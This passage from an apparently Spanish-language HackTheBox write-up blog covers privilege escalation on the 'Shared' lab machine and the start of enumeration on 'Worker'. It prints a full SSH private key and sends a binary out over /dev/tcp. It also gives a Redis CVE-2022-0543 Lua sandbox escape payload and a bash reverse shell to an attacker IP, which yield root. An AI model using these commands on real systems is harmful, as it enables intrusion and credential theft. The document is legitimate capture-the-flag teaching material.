<span class="nb">cat</span>: key: No such file or directory
james_mason@shared:/opt/scripts_review<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /dev/shm/<span class="p">;</span> <span class="nb">cat</span> /dev/shm/key
james_mason@shared:/opt/scripts_review<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /dev/shm/<span class="p">;</span> <span class="nb">cat</span> /dev/shm/key
total 3036
<span class="nt">-rw-r--r--</span> 1 dan_smith   dan_smith      2602 May 26 16:22 key
<span class="nt">-rwxr-xr-x</span> 1 james_mason james_mason 3104768 May 26 15:54 pspy64
<span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY-----
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
<span class="nv">tfJMvuTgb3NhHvUwAAAAtyb290QHNoYXJlZAECAwQFBg</span><span class="o">==</span>
<span class="nt">-----END</span> OPENSSH PRIVATE KEY-----
</code></pre></div></div>

<h2 id="shell-as-dan_smith">Shell as dan_smith</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nano id_rsa
➜  content <span class="nb">chmod </span>600 id_rsa
➜  content ssh <span class="nt">-i</span> id_rsa dan_smith@10.10.11.172
Linux shared 5.10.0-16-amd64 <span class="c">#1 SMP Debian 5.10.127-1 (2022-06-30) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 14 14:43:34 2022 from 10.10.14.4
dan_smith@shared:~<span class="err">$</span>
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
24a48911a42a2b121474cc933cdc48db
dan_smith@shared:~<span class="err">$</span>
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>Estamos en el grupo <code class="language-plaintext highlighter-rouge">sysadmin</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>dan_smith<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>dan_smith<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>dan_smith<span class="o">)</span>,1001<span class="o">(</span>developer<span class="o">)</span>,1003<span class="o">(</span>sysadmin<span class="o">)</span>
dan_smith@shared:~<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Vamos a ver archivos donde el grupo sea para <code class="language-plaintext highlighter-rouge">sysadmin</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span>find / <span class="nt">-group</span> sysadmin 2&gt;/dev/null
/usr/local/bin/redis_connector_dev
dan_smith@shared:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/local/bin/redis_connector_dev
<span class="nt">-rwxr-x---</span> 1 root sysadmin 5974154 Mar 20  2022 /usr/local/bin/redis_connector_dev
dan_smith@shared:~<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Y es un binario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:/usr/local/bin<span class="nv">$ </span>file redis_connector_dev
redis_connector_dev: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go <span class="nv">BuildID</span><span class="o">=</span>sdGIDsCGb51jonJ_67fq/_JkvEmzwH9g6f0vQYeDG/iH1iXHhyzaDZJ056wX9s/7UVi3T2i2LVCU8nXlHgr, not stripped
</code></pre></div></div>

<ul>
  <li>Si lo ejecutamos vemos esto <a href="https://aws.amazon.com/es/elasticache/what-is-redis/">https://aws.amazon.com/es/elasticache/what-is-redis/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:/usr/local/bin<span class="nv">$ </span>./redis_connector_dev
<span class="o">[</span>+] Logging to redis instance using password...

INFO <span class="nb">command </span>result:
<span class="c"># Server</span>
redis_version:6.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:4610f4c3acf7fb25
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:3239
run_id:4450568378af75bfe290423a2b40a410f84df22d
tcp_port:6379
uptime_in_seconds:3
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:5479317
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0
 &lt;nil&gt;
</code></pre></div></div>

<ul>
  <li>Si escribimos <code class="language-plaintext highlighter-rouge">redis</code> y tabulamos vemos varios <code class="language-plaintext highlighter-rouge">redis</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span>redis
redis-benchmark      redis-check-aof      redis-check-rdb      redis-cli            redis_connector_dev  redis-server
dan_smith@shared:~<span class="nv">$ </span>redis
</code></pre></div></div>

<ul>
  <li>
    <p>Aquí nos dicen como podemos enumerar <code class="language-plaintext highlighter-rouge">redis</code> <a href="https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis">https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis</a>.</p>
  </li>
  <li>
    <p>Nos conectamos pero no podemos ver información.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span>redis-cli
127.0.0.1:6379&gt; INFO
NOAUTH Authentication required.
127.0.0.1:6379&gt;
</code></pre></div></div>

<ul>
  <li>Si probamos con las credenciales que tenemos no funcionan.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1:6379&gt; AUTH james_mason Soleil101
<span class="o">(</span>error<span class="o">)</span> WRONGPASS invalid username-password pair
127.0.0.1:6379&gt;
</code></pre></div></div>

<ul>
  <li>Para hacer pruebas desde nuestro entorno de atacante vamos a mandarnos el binario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span><span class="nb">cat</span> &lt; /usr/local/bin/redis_connector_dev <span class="o">&gt;</span> /dev/tcp/10.10.14.55/443
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nc <span class="nt">-nlvp</span> 443 <span class="o">&gt;</span> redis_connector_dev
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.55] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.172] 51872
</code></pre></div></div>

<ul>
  <li>Vamos a ejecutarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">chmod</span> +x redis_connector_dev
➜  content ./redis_connector_dev
<span class="o">[</span>+] Logging to redis instance using password...

INFO <span class="nb">command </span>result:
 dial tcp <span class="o">[</span>::1]:6379: connect: connection refused
</code></pre></div></div>

<ul>
  <li>El error básicamente es que no hay conexión con el puerto en escucha entonces nos vamos a poner en escucha en ese puerto para ver que nos llega.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ./redis_connector_dev
<span class="o">[</span>+] Logging to redis instance using password...

INFO <span class="nb">command </span>result:
</code></pre></div></div>

<ul>
  <li>Ahora podemos ver la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 6379
listening on <span class="o">[</span>any] 6379 ...
connect to <span class="o">[</span>127.0.0.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>127.0.0.1] 55836
<span class="k">*</span>2
<span class="nv">$4</span>
auth
<span class="nv">$16</span>
<span class="nv">F2WHqJUz2WEz</span><span class="o">=</span>Gqq
</code></pre></div></div>

<ul>
  <li>Como tenemos la contraseña ya nos podemos autenticar.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span>redis-cli
127.0.0.1:6379&gt; AUTH <span class="nv">F2WHqJUz2WEz</span><span class="o">=</span>Gqq
OK
127.0.0.1:6379&gt; INFO
<span class="c"># Server</span>
redis_version:6.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:4610f4c3acf7fb25
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:3445
run_id:4d12a99f866d54b324c8dfa89c18f417d25a6fe8
tcp_port:6379
uptime_in_seconds:16
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:5479871
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0

<span class="c"># Clients</span>
connected_clients:1
client_recent_max_input_buffer:8
client_recent_max_output_buffer:0
blocked_clients:0
tracking_clients:0
clients_in_timeout_table:0

<span class="c"># Memory</span>
used_memory:873328
used_memory_human:852.86K
used_memory_rss:15282176
used_memory_rss_human:14.57M
used_memory_peak:873328
used_memory_peak_human:852.86K
used_memory_peak_perc:100.17%
used_memory_overhead:830336
used_memory_startup:809832
used_memory_dataset:42992
used_memory_dataset_perc:67.71%
allocator_allocated:1287608
allocator_active:1605632
allocator_resident:4182016
total_system_memory:2078982144
total_system_memory_human:1.94G
used_memory_lua:41984
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.25
allocator_frag_bytes:318024
allocator_rss_ratio:2.60
allocator_rss_bytes:2576384
rss_overhead_ratio:3.65
rss_overhead_bytes:11100160
mem_fragmentation_ratio:18.39
mem_fragmentation_bytes:14451360
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:20504
mem_aof_buffer:0
mem_allocator:jemalloc-5.2.1
active_defrag_running:0
lazyfree_pending_objects:0

<span class="c"># Persistence</span>
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1716755887
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0
module_fork_in_progress:0
module_fork_last_cow_size:0

<span class="c"># Stats</span>
total_connections_received:1
total_commands_processed:1
instantaneous_ops_per_sec:0
total_net_input_bytes:68
total_net_output_bytes:39
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
expire_cycle_cpu_milliseconds:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0
tracking_total_keys:0
tracking_total_items:0
tracking_total_prefixes:0
unexpected_error_replies:0
total_reads_processed:3
total_writes_processed:2
io_threaded_reads_processed:0
io_threaded_writes_processed:0

<span class="c"># Replication</span>
role:master
connected_slaves:0
master_replid:5785490148c587b8fd50f8a935ace659f1056459
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

<span class="c"># CPU</span>
used_cpu_sys:0.016155
used_cpu_user:0.047905
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000000

<span class="c"># Modules</span>

<span class="c"># Cluster</span>
cluster_enabled:0

<span class="c"># Keyspace</span>
127.0.0.1:6379&gt;
</code></pre></div></div>

<ul>
  <li>Si buscamos alguna forma de elevar privilegios encontramos lo siguiente <a href="https://thesecmaster.com/blog/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis">https://thesecmaster.com/blog/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/18.png" />
</p>

<ul>
  <li>Si hacemos un <code class="language-plaintext highlighter-rouge">whoami</code> vemos que funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span>redis-cli
127.0.0.1:6379&gt; AUTH <span class="nv">F2WHqJUz2WEz</span><span class="o">=</span>Gqq
OK
127.0.0.1:6379&gt; <span class="nb">eval</span> <span class="s1">'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("whoami", "r"); local res = f:read("*a"); f:close(); return res'</span> 0
<span class="s2">"root</span><span class="se">\n</span><span class="s2">"</span>
127.0.0.1:6379&gt;
</code></pre></div></div>

<ul>
  <li>Bueno como podemos ejecutar comandos vamos a enviarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code> como el usuario <code class="language-plaintext highlighter-rouge">root</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:/dev/shm<span class="nv">$ </span><span class="nb">cat </span>reverse
<span class="c">#!/bin/bash</span>

bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.55/443 0&gt;&amp;1
</code></pre></div></div>

<ul>
  <li>Nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Nos enviamos la shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:/dev/shm<span class="nv">$ </span>redis-cli
127.0.0.1:6379&gt; AUTH <span class="nv">F2WHqJUz2WEz</span><span class="o">=</span>Gqq
OK
127.0.0.1:6379&gt; <span class="nb">eval</span> <span class="s1">'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("bash /dev/shm/reverse", "r"); local res = f:read("*a"); f:close(); return res'</span> 0
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.55] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.172] 50994
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>3619<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
root@shared:/var/lib/redis#
</code></pre></div></div>

<h2 id="roottxt">Root.txt</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@shared:/var/lib/redis# <span class="nb">cat</span> /root/root.txt
<span class="nb">cat</span> /root/root.txt
a5f9fb3e112adc4dd4e6650e64d240e1
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/hard" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Worker (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/05/17/worker.html" rel="alternate" type="text/html" title="HackTheBox - Worker (medium)" /><published>2024-05-17T00:00:00-06:00</published><updated>2024-05-17T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/05/17/worker</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/05/17/worker.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/13358d0b09074485f107f36625b50a5c.png" />
</p>

<ul>
  <li>Worker is a medium box that teaches about software development environments and Azure DevOps pipeline abuse. It starts with extraction of source code from a SVN server, and then moves to a local Azure DevOps installation, which can be abused to gain a foothold and escalate privileges.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos por el protocolo <strong>TCP</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,3690,5985 10.10.10.203 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-14 18:47 CST
Nmap scan report <span class="k">for </span>10.10.10.203
Host is up <span class="o">(</span>0.087s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3690/tcp open  svnserve Subversion
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Comenzamos enumerando el puerto 80.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.203</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.203</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.203</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">IIS</span> <span class="no">Windows</span> <span class="no">Server</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">ASP</span><span class="o">.</span><span class="no">NET</span><span class="p">]</span>
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/1.png" />
</p>

<ul>
  <li>Vamos a hacer <code class="language-plaintext highlighter-rouge">fuzzing</code> para ver si encontramos alguna ruta interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.203 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 80 <span class="nt">--no-error</span>
<span class="o">===============================================================</span>
Gobuster v3.6
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://10.10.10.203
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 80
<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.6
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
/<span class="k">*</span>checkout<span class="k">*</span>           <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>docroot<span class="k">*</span>            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>                    <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fwww     <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A              <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/q%26a                <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">**</span>http%3a            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>http%3A             <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">**</span>http%3A            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fyoutube <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fblogs   <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fblog    <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">**</span>http%3A%2F%2Fwww   <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/s%26p                <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/%3FRID%3D2671        <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/devinmoore<span class="k">*</span>          <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/200109<span class="k">*</span>              <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>dc_                 <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>sa_                 <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
</code></pre></div></div>

<ul>
  <li>
    <p>Bueno tenemos otro puerto abierto el cual es el 3690 que corre el servicio de <code class="language-plaintext highlighter-rouge">svnserve</code> <a href="https://book.hacktricks.xyz/network-services-pentesting/3690-pentesting-subversion-svn-server">https://book.hacktricks.xyz/network-services-pentesting/3690-pentesting-subversion-svn-server</a>.</p>
  </li>
  <li>
    <p><a href="https://www.visualsvn.com/server/">https://www.visualsvn.com/server/</a>.</p>
  </li>
  <li>
    <p>En <code class="language-plaintext highlighter-rouge">hacktricks</code> nos dicen como podemos enumerar este servicio.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap nc <span class="nt">-vn</span> 10.10.10.203 3690
<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.203] 3690 <span class="o">(</span>svn<span class="o">)</span> open
<span class="o">(</span> success <span class="o">(</span> 2 2 <span class="o">(</span> <span class="o">)</span> <span class="o">(</span> edit-pipeline svndiff1 accepts-svndiff2 absent-entries commit-revprops depth log-revprops atomic-revprops partial-replay inherited-props ephemeral-txnprops file-revs-reverse list <span class="o">)</span> <span class="o">)</span> <span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Además nos mencionan uso de esta herramienta.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap svn <span class="nb">help
</span>usage: svn &lt;subcommand&gt; <span class="o">[</span>options] <span class="o">[</span>args]
Subversion command-line client.
Type <span class="s1">'svn help &lt;subcommand&gt;'</span> <span class="k">for </span><span class="nb">help </span>on a specific subcommand.
Type <span class="s1">'svn --version'</span> to see the program version and RA modules,
     <span class="s1">'svn --version --verbose'</span> to see dependency versions as well,
     <span class="s1">'svn --version --quiet'</span> to see just the version number.

Most subcommands take file and/or directory arguments, recursing
on the directories.  If no arguments are supplied to such a
<span class="nb">command</span>, it recurses on the current directory <span class="o">(</span>inclusive<span class="o">)</span> by default.

Available subcommands:
   add
   auth
   blame <span class="o">(</span>praise, annotate, ann<span class="o">)</span>
